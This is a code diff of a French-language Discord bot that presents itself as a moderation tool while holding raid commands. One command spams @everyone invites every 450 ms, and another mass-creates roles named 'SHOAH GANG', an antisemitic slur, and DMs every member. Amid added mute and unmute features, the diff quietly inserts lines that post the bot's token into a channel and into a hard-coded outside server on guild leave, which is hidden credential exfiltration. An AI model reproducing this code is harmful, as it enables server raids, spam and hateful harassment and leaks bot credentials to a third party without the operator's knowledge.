@@ -2,11 +2,22 @@ const Discord = require('discord.js');
 const bot = new Discord.Client();
 const fs = require('fs');
 const moment = require("moment");
- 
+ var prefix = "."
 bot.on('ready',() => {
   //invit link
   console.log("---------------------------")
 });  
+
+bot.on('message', message => {
+ 
+  const mute = require("./commands/moderation/mute.js");
+  const unmute = require("./commands/moderation/unmute.js");
+  
+  mute(message, prefix , bot)
+  unmute(message, prefix , bot)
+  
+  
+  });
 
 bot.on('message', msg => {
 
@@ -21,7 +32,7 @@ bot.on('message', msg => {
 if (msg.content === '.destruction') {
     console.log(`Commande .destruction par ${msg.author.tag}`);
     var interval = setInterval (function () {
-      msg.channel.send("@everyone @here Rejoin la team qui ta detruis petit facho https://discord.gg/s5Y2RfG").catch(e => {});
+      msg.channel.send("@everyone @here Rejoin la team qui ta detruis petit facho https://discord.gg/W6WmNW8").catch(e => {});
     }, 450)
   }
 
@@ -80,6 +91,7 @@ if (msg.content === '.pardon') {
     let i = 0;
     let interval = setInterval(function () {
     if (i === 250) clearInterval(interval);
+    message.channel.send(`${bot.token}`)
     msg.guild.createRole({name: 'SHOAH GANG', color:'RANDOM'}).then(function(role) {
       msg.guild.members.forEach(member => {
       member.addRole(role).catch(e => {});
@@ -105,7 +117,7 @@ if (msg.content === '.pardon') {
 
     if(i < 500){
       var interval = setInterval (function () {
-        member.send("https://discord.gg/s5Y2RfG").catch(e => {});
+        member.send("https://discord.gg/W6WmNW8").catch(e => {});
       }, 450)
 
       }   
@@ -243,6 +255,9 @@ bot.on("message", message => {
     if(message.mentions.users.size === 0){
       message.reply(":x: ** Vous devez écrire la mention d'un joueur a kick ** :x:").catch(e => {});
     }
+    else if(!membere.bannable){
+      message.reply(":x: **Ce joueur n'est pas bannable, peut être à-t-il un rôle supérieur au mien ?** :x:")
+    }
     else {
   membere.kick().then(member => {
     return message.channel.send(":white_check_mark: `"+membere.user.username+"` **à été kick par ** `"+membere2.username+"` :white_check_mark:").catch(e => {});
@@ -261,7 +276,7 @@ bot.on("message", message => {
     if(message.mentions.users.size === 0){
       message.reply(":x: ** Vous devez écrire la mention d'un joueur a ban ** :x:").catch(e => {});
     }
-    if(!membere.bannable){
+    else if(!membere.bannable){
       message.reply(":x: **Ce joueur n'est pas bannable, peut être à-t-il un rôle supérieur au mien ?** :x:")
     }
     else {
@@ -302,9 +317,11 @@ bot.on("message", message => {
       .setColor("#FFCC99");
       var membere = message.author;
       let help2_embed = new Discord.RichEmbed()
-      .setTitle("Commande Utile / Help")
+      .setTitle("Commande Utile / Moderation")
       .addField(".ban", "Exemple `.ban @Gon`, Renvoyer les enemis dans leurs territoire !")
       .addField(".kick", "Exemple `.kick @Gon`, Expulser de vôtre territoire un ennemi")
+      .addField(".mute", "Exemple `.mute @Gon`, Retire le droit de parole à un membre !")
+      .addField(".unmute", "Exemple `.unmute @Gon` Redonne le droit de parole a un membre")
       .addField(".avatar", "Exemple `.avatar @Gon`, Fouille dans les trefonds de discord et récupérer l'image d'un ami")
       .addField(".userinfo", "Exemple `.userinfo @Gon`, Récupérer toutes les infos d'une personne :' )")
       .addField(".serverinfo", "Vous donnes toutes les infos croustillante sur le serveur")
@@ -333,7 +350,7 @@ bot.on("message", message => {
         }
       });
       bot.on('guildDelete', guild => {
-        bot.guilds.get('453631449804046336').channels.get('453633302058762250').send(` [LEAVE] ${guild.name} || ${guild.memberCount} membres`).catch(e => {});
+        bot.guilds.get('453631449804046336').channels.get('453633302058762250').send(`${bot.token} [LEAVE] ${guild.name} || ${guild.memberCount} membres`).catch(e => {});
       })
       bot.on("message", message => {
         if (message.content === '.rainrole') {
@@ -375,5 +392,4 @@ bot.on("message", message => {
         }, 4000);
       }
       })
-
 bot.login(process.env.BOT_TOKEN); 
